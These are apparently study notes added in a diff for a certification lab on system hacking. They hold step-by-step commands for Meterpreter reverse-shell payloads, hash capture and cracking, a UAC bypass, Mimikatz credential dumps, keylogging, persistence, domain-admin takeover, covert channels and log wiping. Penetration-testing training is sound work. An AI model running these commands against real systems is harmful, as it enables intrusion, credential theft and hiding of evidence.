@@ -1,0 +1,364 @@
+In the first step (footprinting) of the security assessment and penetration testing of your organization, you collected open-source information about your organization. In the second step (scanning), you collected information about open ports and services, OSes, and any configuration lapses. In the third step (enumeration), you collected information about NetBIOS names, shared network resources, policy and password details, users and user groups, routing tables, and audit and service settings. In the fourth step (vulnerability analysis), you collected information about network vulnerabilities, application and service configuration errors, applications installed on the target system, accounts with weak passwords, and files and folders with weak permissions.
+
+There are four steps in the system hacking:
+
+	• Gaining Access: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system
+	• Escalating Privileges: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges
+	• Maintaining Access: Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding, or tampering with sensitive system files
+	• Clearing Logs: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.
+
+	• Perform active online attack to crack the system’s password using Responder
+	• Audit system passwords using L0phtCrack
+	• Find vulnerabilities on exploit sites
+	• Exploit client-side vulnerabilities and establish a VNC session
+	• Gain access to a remote system using Armitage
+	• Gain access to a remote system using Ninja Jonin
+	• Perform buffer overflow attack to gain access to a remote system
+	• Perform privilege escalation to gain higher privileges
+
+	• Escalate privileges using privilege escalation tools and exploit client-side vulnerabilities
+	• Hack a Windows machine using Metasploit and perform post-exploitation using Meterpreter
+	• Escalate privileges by exploiting vulnerability in pkexec
+	• Escalate privileges in Linux machine by exploiting misconfigured NFS
+	• Escalate privileges by bypassing UAC and exploiting Sticky Keys
+	• Escalate privileges to gather hashdump using Mimikatz
+	• Maintain remote access and hide malicious activities
+
+	• User system monitoring and surveillance using Power Spy
+	• User system monitoring and surveillance using Spytech SpyAgent
+	• Hide files using NTFS streams
+	• Hide data using white space steganography
+	• Image steganography using OpenStego and StegOnline
+	• Maintain persistence by abusing boot or logon autostart execution
+	• Maintain domain persistence by exploiting Active Directory Objects
+	• Privilege escalation and maintain persistence using WMI
+	• Covert channels using Covert_TCP
+	• Clear logs to hide the evidence of compromise
+
+	• View, enable, and clear audit policies using Auditpol
+	• Clear Windows machine logs using various utilities
+	• Clear Linux machine logs using the BASH shell
+	• Hiding artifacts in windows and Linux machines
+	• Clear Windows machine logs using Ccleaner
+
+---------------------------
+
+
+	Perform Active Online Attack to Crack the System’s Password using Responder   => Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name 
+	suffix. By default, the tool only responds to a File Server Service request, which is for SMB.
+	
+	1. sudo responder -I eth0  
+	2. On windows machine access any shared folder on remote machine 
+	3. Responder capture the logs &  It collects the hashes of the logged-in user of the target machine,
+	4. Copy hash in to text file 
+	5. Use John the ripper to extract password from hash value
+		a.  john hash.txt 
+-------
+Use exploit-db.com to search the exploite code for that  specific OS 
+------
+---Exploit Client-Side Vulnerabilities and Establish a VNC Session----
+	1.  msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe
+	2. Type mkdir /var/www/html/share and press Enter to create a shared folder
+	3. Type chmod -R 755 /var/www/html/share and press Enter
+	4. Type chown -R www-data:www-data /var/www/html/share and press Enter
+	5. Copy the malicious file to the shared location by typing cp /home/attacker/Desktop/Test.exe /var/www/html/share and pressing Enter
+
+	1. Msfconsole
+	2. use exploit/multi/handler
+	3. Type set payload windows/meterpreter/reverse_tcp and press Enter
+	4. Type set LHOST 10.10.1.13 and press Enter
+	5. Type set LPORT 444 and press Enter
+	6.  exploit
+	7. If the Meterpreter shell is not automatically connected to the session, type sessions -i 1 and press Enter to open a session in Meterpreter shell.
+
+User execute the file on the remote machine & it established the connection with the hacker 
+Check sysinfo once connected with remote system
+	1. upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1  
+	2. Shell
+	3.  powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”  => Ensure that you have added a space between two dots after -Command “.[space]..
+	4. type exit and press Enter to revert to the Meterpreter session.
+
+
+exploit VNC vulnerability to gain remote access to the Windows 11 machine. To do so, type run vnc and press Enter.
+
+
+	Buffer overflow immunity debugger 
+	
+	
+-----------------
+Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities
+
+	• msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe
+	• Type mkdir /var/www/html/share and press Enter to create a shared folder
+	• Type chmod -R 755 /var/www/html/share and press Enter
+	• Type chown -R www-data:www-data /var/www/html/share and press Enter
+	• 
+	• type msfconsole in the terminal and press Enter to launch the Metasploit framework.
+	• use exploit/multi/handler and press Enter to handle exploits launched outside the framework.
+	•  set payload windows/meterpreter/reverse_tcp and press Enter to set a payload.
+	• Type set LHOST 10.10.1.13 and press Enter to set the localhost.
+	• exploit -j -z 
+	
+	• getuid and press Enter. This displays the current user ID, as shown in the screenshot.
+	• Windows privileges can be used to escalated privileges. These privileges include SeDebug, SeRestore & SeBackup & SeTakeOwnership, SeTcb & SeCreateToken, SeLoadDriver, and SeImpersonate & SeAssignPrimaryToken. BeRoot lists all available privileges and highlights if you have one of these tokens.
+		○ upload /home/attacker/Desktop/BeRoot/beRoot.exe      => upload beRoot program for priv escalation
+	• Shell
+	• Execute beRoot.exe
+
+	• Now we will use GhostPack Seatbelt tool to gather host information and perform security checks to find insecurities in the target system.
+
+Upload seatbealt.exe
+	• upload /home/attacker/Desktop/Seatbelt.exe
+	• 
+	• Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.
+	• let us check our current system privileges by executing the run post/windows/gather/smart_hashdump command. (Insufficient privileges to dump hashes!. Need privilege access)
+	• getsystem -t 1: Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique. => Need privilege access to execute this command.
+	• we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
+	• we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.
+	• we will use the bypassuac_fodhelper exploit for windows. To do so, type 
+	use exploit/windows/local/bypassuac_fodhelper and press Enter.
+	• you need to configure the exploit. To know which options you need to configure in the exploit, type show options and press Enter. 
+	• set SESSION 1 (1 is the current Meterpreter session which is running in the background) and press Enter.
+	• set payload windows/meterpreter/reverse_tcp
+	• Payload options section displays the requirement for the payload.
+	Observe that:
+	The LHOST option is required, but Current Setting is empty (here, you need to set the IP Address of the local host, (here, the Parrot Security machine)
+	The EXITFUNC option is required, but Current Setting is already set to process, so ignore this option
+	The LPORT option is required, but Current Setting is already set to port number 4444, so ignore this option
+	•  set LHOST 10.10.1.13 and press Enter.
+	•  set TARGET 0
+	• exploit and press Enter. 
+	•  getuid
+	• getsystem -t 1 
+	•  getuid
+	•  run post/windows/gather/smart_hashdump 
+	•  remotely execute commands such as clearev to clear the event logs that require administrative or root privileges.
+	• 
+	• --------------------------------------------
+	• 
+	• ---------Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter
+	• msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
+	•  Type mkdir /var/www/html/share and press Enter to create a shared folder
+	• Type chmod -R 755 /var/www/html/share and press Enter
+	• Type chown -R www-data:www-data /var/www/html/share and press Enter
+	• cp /home/attacker/Desktop/Backdoor.exe /var/www/html/share/
+	• service apache2 start 
+	• Msfconsole
+	• use exploit/multi/handler
+	• Type set payload windows/meterpreter/reverse_tcp and press Enter
+	• Type set LHOST 10.10.1.13 and press Enter
+	• Type show options and press Enter
+	•  exploit -j -z
+	• After executing the file on victim machine, it established the connection with host. Type following command on meterpreter shell.
+	• Sysinfo
+	• Ipconfig
+	• Keyscan_start
+	• Keyscan_dump
+	•  wmic /node:"" product get name,version,vendor
+	
+--------------- Escalate Privileges by Exploiting Vulnerability in pkexec
+
+	• mkdir /tmp/pwnkit
+	• mv CVE-2021-4034 /tmp/pwnkit/ 
+	• cd CVE-2021-4034
+	• Make
+	• ./CVE-2021-4034
+	• This will escalate the privilege from attacker to root
+
+
+---Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS
+sudo apt install nfs-kernel-server
+
+---Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
+	• msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+	• Copy file on web server path
+	• Msfconsole
+	• use exploit/multi/handler 
+	• set payload windows/meterpreter/reverse_tcp
+	• set lhost 10.10.1.13
+	• set lport 444
+	• Run
+	• After remote connection with attacker OS
+	• search bypassuac and press Enter, to get the list of bypassuac modules.
+	• use exploit/windows/local/bypassuac_fodhelper
+	• set session 1
+	• show options in the meterpreter console and press Enter.
+	• To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.
+	• To set the TARGET option, type set TARGET 0 and press Enter
+	• exploit and press Enter
+	• BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine.
+	• getsystem -t 1 and press Enter to elevate previleges.
+	• Getuid
+	• background and press Enter to background the current session.
+	• use post/windows/manage/sticky_keys and press Enter.
+	• type sessions i* and press Enter to list the sessions in meterpreter.
+	• set session 2
+	• Exploit 
+	• Windows 11 machine and sign out from the Admin account and sign into Martin account using apple as password.
+	• Martin is a user account without any admin privileges, lock the system and from the lock screen press Shift key 5 times, this will open a command prompt on the lock screen with System privileges instead of sticky keys error window.
+
+
+----Escalate Privileges to Gather Hashdump using Mimikatz
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
+Copy file to web server folder to share 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.1.13
+set lport 444
+Run
+Sysinfo
+background and press Enter to background the current session.
+use exploit/windows/local/bypassuac_fodhelper 
+set session 1 and press Enter.
+Show options
+To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.
+To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).
+Type exploit and press Enter to begin the exploit on Windows 11 machine.
+getsystem -t 1 and press Enter to elevate previleges.
+load kiwi in the console and press Enter to load mimikatz.
+lsa_dump_sam and press Enter to load NTLM Hash of all users.
+ LSA Secrets Login hashes type lsa_dump_secrets and press Enter.
+ password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password  => change password for admin 
+
+
+----------Maintain Remote Access and Hide Malicious Activities
+
+
+
+---------------Maintain Persistence by Abusing Boot or Logon Autostart Execution
+
+	• msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/exploit.exe
+	• Type mkdir /var/www/html/share and press Enter to create a shared folder
+	• Type chmod -R 755 /var/www/html/share and press Enter
+	• Type chown -R www-data:www-data /var/www/html/share and press Enter
+	• Copy exploit.exe to /var/www/html/share
+	• service apache2 start
+	• Msfconsole
+	• use exploit/multi/handler 
+	• set payload windows/meterpreter/reverse_tcp
+	• set lhost 10.10.1.13
+	• set lport 444
+	• Run
+	• Getuid
+	•  background and press Enter, to background the current session.
+	•  the terminal window, type use exploit/windows/local/bypassuac_fodhelper and press Enter.
+	• set session 1
+	• show options in the meterpreter console 
+	• set LHOST 10.10.1.13
+	• set TARGET 0 
+	• Exploit
+	• getsystem -t 1 and press Enter to elevate previleges.
+	• we will navigate to the Startup folder, to do that type cd “C:\\ProgramData\\Start Menu\\Programs\\Startup” and press Enter.
+	• msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=8080 -f exe > payload.exe  => different terminal window
+	• upload /home/attacker/payload.exe
+	• In Metasploit type use exploit/multi/handler and press Enter.
+	• Now type set payload windows/meterpreter/reverse_tcp and press Enter.
+	• Type set lhost 10.10.1.13 and press Enter to set lhost
+	• Type set lport 8080 and press Enter to set lport.
+	• Now type exploit to start the exploitation.
+	
+	
+-------Maintain Domain Persistence by Exploiting Active Directory Objects
+	• msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Exploit.exe
+	• Type mkdir /var/www/html/share and press Enter to create a shared folder
+	• Type chmod -R 755 /var/www/html/share and press Enter
+	• Type chown -R www-data:www-data /var/www/html/share and press Enter
+	• cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/ 
+	• service apache2 start
+	• Msfconsole
+	• use exploit/multi/handler and press Enter.
+	• set payload windows/meterpreter/reverse_tcp
+	•  set lhost 10.10.1.13
+	• set lport 444
+	• Run
+	• upload -r /home/attacker/PowerTools-master C:\\Users\\Administrator\\Downloads
+	• Shell    => show the C:\\Users\\Administrator\\Downloads directory
+	• cd C:\Windows\System32
+	•  powershell and press Enter to launch powershell
+	• cd C:\Users\Administrator\Downloads\PowerView
+	• Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
+	• Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs   => Get user details
+	• REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
+	• net group “Domain Admins” Martin /add /domain
+	• 
+	
+
+
+----Privilege Escalation and Maintain Persistence using WMI
+
+	• msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Payload.exe
+	• msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/wmi.exe
+	• Type mkdir /var/www/html/share and press Enter to create a shared folder
+	• Type chmod -R 755 /var/www/html/share and press Enter
+	• Type chown -R www-data:www-data /var/www/html/share and press Enter
+	• cp /home/attacker/Desktop/Payload.exe /var/www/html/share/
+	• cp /home/attacker/Desktop/wmi.exe /var/www/html/share/
+	• Service apache2 start
+	• Msfconsole
+	• use exploit/multi/handler
+	•  set lhost 10.10.1.13
+	• set lport 444
+	• Run
+	• Run payload.exe on windows machine
+	• Getuid
+	•  upload /home/attacker/Wmi-Persistence-master C:\\Users\\Administrator\\Downloads
+	•  load powershell
+	•  powershell_shell
+	• Import-Module ./WMI-Persistence.ps1
+	• Install-Persistence -Trigger Startup -Payload “C:\Users\Administrator\Downloads\wmi.exe”
+	• Msfconsole
+	• use exploit/multi/handler
+	•  set lhost 10.10.1.13
+	• set lport 444
+	• Exploit 
+	• Reboot windows machine 
+
+
+
+
+-----Covert Channels using Covert_TCP
+
+	• echo “Secret Message” > message.txt 
+	• cc -o covert_tcp covert_tcp.
+	•  tcpdump -nvvx port 8888 -i lo    => Ubuntu machine
+	• A new Terminal tab appears; type the commands below to create, and then navigate to the Receive folder on Desktop:
+		○ cd Desktop
+		○ mkdir Receive
+		○ cd Receive
+	• ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt 
+	• ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
+
+
+
+----clear logs
+ Command Prompt window with Administrator privileges appears. Type auditpol /get /category:* and press Enter to view all the audit policies.
+auditpol /set /category:"system","account logon" /success:enable /failure:enable
+auditpol /get /category:* 
+auditpol /clear /y
+auditpol /get /category:*
+
+
+
+ E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\Clear_Event_Viewer_Logs.bat. Right-click Clear_Event_Viewer_Logs.bat and click Run as administrator.
+wevtutil cl [log_name] (here, we are clearing system logs) and press Enter to clear a specific event log.
+cipher /w:[Drive or Folder or File Location] and press Enter to overwrite deleted files in a specific drive, folder, or file.
+
+
+Clearing Linux logs
+export HISTSIZE=0 and press Enter to disable the BASH shell from saving the history.
+history -c and press Enter to clear the stored history.
+shred ~/.bash_history and press Enter to shred the history file, making its content unreadable.
+ shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
+
+
+
+Hiding Artifacts in Windows and Linux Machines
+cd C:\Users\Admin\Desktop
+mkdir Test
+ attrib +h +s +r Test and Press Enter to hide the Test folder.
+unhide the Test directory type attrib -s -h -r Test and press Enter.
+Test account type net user Test /active:yes and press Enter.
+ hide the user account type net user Test /active:no and press Enter. The Test account is removed from the list.
+
+
+
